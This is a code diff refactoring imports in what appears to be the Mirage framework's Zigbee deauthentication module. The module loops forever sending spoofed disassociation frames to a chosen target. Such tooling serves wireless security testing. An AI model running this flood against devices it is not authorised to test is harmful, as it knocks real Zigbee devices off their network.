@@ -1,6 +1,8 @@
-from mirage.libs import zigbee,utils,io
 from mirage.core import module
-import random
+from mirage.libs import io, utils
+from mirage.libs.zigbee_utils.helpers import addressToString
+from mirage.libs.zigbee_utils.packets import ZigbeeDisassociationNotification
+
 
 class zigbee_deauth(module.WirelessModule):
 	def init(self):
@@ -38,7 +40,7 @@ class zigbee_deauth(module.WirelessModule):
 			else:
 				io.fail("You must specify a target.")
 				return self.nok()
-			io.info("Target selected: "+zigbee.addressToString(self.target))
+			io.info("Target selected: "+addressToString(self.target))
 
 
 			if self.args["SOURCE"] != "":
@@ -46,11 +48,11 @@ class zigbee_deauth(module.WirelessModule):
 			else:
 				io.fail("You must specify a source address.")
 				return self.nok()
-			io.info("Source selected: "+zigbee.addressToString(self.source))
+			io.info("Source selected: "+addressToString(self.source))
 
 			self.reason = utils.integerArg(self.args["REASON"])
 			while True:
-				self.emitter.sendp(zigbee.ZigbeeDisassociationNotification(destPanID=self.panid, srcAddr=self.source,destAddr=self.target,sequenceNumber=1,reason=self.reason))
+				self.emitter.sendp(ZigbeeDisassociationNotification(destPanID=self.panid, srcAddr=self.source,destAddr=self.target,sequenceNumber=1,reason=self.reason))
 
 			return self.ok()
 		else:
